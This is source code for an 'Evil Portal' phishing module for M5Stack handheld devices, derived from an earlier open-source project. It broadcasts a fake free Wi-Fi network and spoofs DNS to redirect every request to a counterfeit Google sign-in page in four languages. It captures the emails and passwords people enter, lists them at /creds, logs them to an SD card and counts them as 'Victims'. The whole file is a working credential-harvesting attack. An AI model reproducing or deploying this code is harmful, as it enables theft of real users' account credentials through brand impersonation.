// Borrowed from https://github.com/marivaaldo/evil-portal-m5stack/ which
// has iterative iprovements over my own stand-alone M5Stick Evil Portal.
// Retaining the Portuguese translations since this project has a large
// fan base in Brazil. Shouts to CyberJulio as well.

#define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
#define SD_CREDS_PATH "/nemo-portal-creds.txt"


#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Sign in"
#define LOGIN_SUBTITLE "Sign In With Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Fazer login"
#define LOGIN_SUBTITLE "Use sua Conta do Google"
#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Senha"
#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
#define LOGIN_BUTTON "Avançar"
#define LOGIN_AFTER_MESSAGE "Fazendo login..."
#define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
#elif defined(LANGUAGE_IT_IT)
#define LOGIN_TITLE "Accedi"
#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
#define LOGIN_BUTTON "Avanti"
#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
#elif defined(LANGUAGE_FR_FR)
#define LOGIN_TITLE "Connexion"
#define LOGIN_SUBTITLE "Utiliser votre compte Google"
#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
#define LOGIN_MESSAGE "Merci de vous connecter pour obtenir une navigation sécurisée."
#define LOGIN_BUTTON "Suivant"
#define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
#define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
#endif

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = 0;
String capturedCredentialsHtml = "";

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

void setSSID(String ssid){
  #if defined USE_EEPROM
  Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
  for(int i = 0; i < ssid.length(); i++) {
    EEPROM.write(i + apSsidOffset, ssid[i]);
    Serial.printf("%d:%d ", i+ apSsidOffset, ssid[i]);
  }
  EEPROM.write(apSsidOffset + ssid.length(), 0);
  EEPROM.commit();
  Serial.println("\ndone.");
  #endif
  apSsidName=ssid;
  return;
}

#ifdef CARDPUTER
void confirmOrTypeSSID(){
  DISP.fillScreen(BGCOLOR);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("  WiFi SSID  ");
  DISP.setTextSize(TINY_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println(TYPE_SSID_TEXT);
  DISP.setTextSize(SMALL_TEXT);
  uint8_t ssidTextCursorY = DISP.getCursorY();
  String currentSSID = String(apSsidName.c_str());
  DISP.printf("%s", currentSSID.c_str());
  bool ssid_ok = false;

  while(!ssid_ok){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del) {
        currentSSID.remove(currentSSID.length() - 1);
      }
      if(status.enter) {
        ssid_ok = true;
      }
      if(currentSSID.length() >= 32) {
        continue;
      }
      for(auto i : status.word) {
        if(i != '?' && i != '$' && i != '\"' && i != '[' && i != '\\' && i != ']' && i != '+'){
          currentSSID += i;
        }
      }
      DISP.fillRect(0, ssidTextCursorY, DISP.width(), DISP.width()- ssidTextCursorY, BLACK);
      DISP.setCursor(0, ssidTextCursorY);
      DISP.printf("%s", currentSSID.c_str());
    }
  }

  if(currentSSID != apSsidName && currentSSID.length() > 2){
    setSSID(currentSSID);
  }
}
#endif

void setupWiFi() {
  Serial.println("Initializing WiFi");
  #if defined(CARDPUTER)
  confirmOrTypeSSID();
  #endif // Cardputer
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void getSSID(){
  String ssid="";
  #if defined USE_EEPROM
  if(EEPROM.read(apSsidOffset) < 32 || EEPROM.read(apSsidOffset) > 254){
    Serial.println("SSID EEPROM Corrupt or Uninitialized. Using Defaults.");
    apSsidName=DEFAULT_AP_SSID_NAME;
    return;
  }
  for(int i = apSsidOffset; i < apSsidOffset + apSsidMaxLen; i++) {
    int ebyte=EEPROM.read(i);
    Serial.printf("%d:%d ", i, ebyte);
    if(ebyte < 32 || ebyte > 254){
      Serial.println("SSID: " + ssid);
      apSsidName=ssid;
      return;
    }
    ssid += char(ebyte);
  }
  #else
    apSsidName=DEFAULT_AP_SSID_NAME;
  #endif
  return;
}

void printHomeToScreen() {
  DISP.fillScreen(BGCOLOR);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" NEMO PORTAL ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf("%s\n\n",apSsidName.c_str());
  DISP.print("WiFi IP: ");
  DISP.println(AP_GATEWAY);
  DISP.println("Paths: /creds /ssid");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body) {
  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
    "  <meta charset='UTF-8'>"
    "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
    "</head>"
    "<body>"
    "  <div class='container'>"
    "    <div class='logo-container'>"
    "      <?xml version='1.0' standalone='no'?>"
    "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
    "    </div>"
    "    <div class=form-container>"
    "      <center>"
    "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>"
    "      </center>"
    "      <div style='min-height: 150px'>"
    + body + "      </div>"
    "    </div>"
    "  </div>"
    "</body>"
    "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String index_GET() {
  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;

#if defined(SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif
  return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

String ssid_GET() {
  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}

String ssid_POST() {
  String ssid = getInputValue("ssid");
  Serial.println("SSID Has been changed to " + ssid);
  setSSID(ssid);
  printHomeToScreen();
  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

#if defined(M5LED)
void blinkLed() {
  int count = 0;
  while (count < 5) {
    digitalWrite(IRLED, M5LED_ON);
    delay(500);
    digitalWrite(IRLED, M5LED_OFF);
    delay(500);
    count = count + 1;
  }
}
#endif

void shutdownWebServer() {
  Serial.println("Stopping DNS");
  dnsServer.stop();
  Serial.println("Closing Webserver");
  webServer.close();
  Serial.println("Stopping Webserver");
  webServer.stop();
  Serial.println("Setting WiFi to STA mode");
  WiFi.mode(WIFI_MODE_STA);
  Serial.println("Resetting SSID");
  getSSID();
}

void setupWebServer() {
  Serial.println("Starting DNS");
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
  Serial.println("Setting up Webserver");
  webServer.on("/post", []() {
    totalCapturedCredentials = totalCapturedCredentials + 1;
    webServer.send(HTTP_CODE, "text/html", index_POST());
#if defined(STICK_C_PLUS)
    SPEAKER.tone(4000);
    delay(50);
    SPEAKER.mute();
#elif defined(CARDPUTER)
    //SPEAKER.tone(4000, 50);     //Silent mode, just in case
#endif
    DISP.print("Victim Login");
#if defined(M5LED)
    blinkLed();
#endif
  });
  
  Serial.println("Registering /creds");
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds_GET());
  });
  Serial.println("Registering /clear");
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });
  Serial.println("Registering /ssid");
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_GET());
  });
  Serial.println("Registering /postssid");
  webServer.on("/postssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_POST());
    shutdownWebServer();
    isSwitching=true;
    current_proc=19;
  });
  Serial.println("Registering /*");
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });
  Serial.println("Starting Webserver");
  webServer.begin();
}
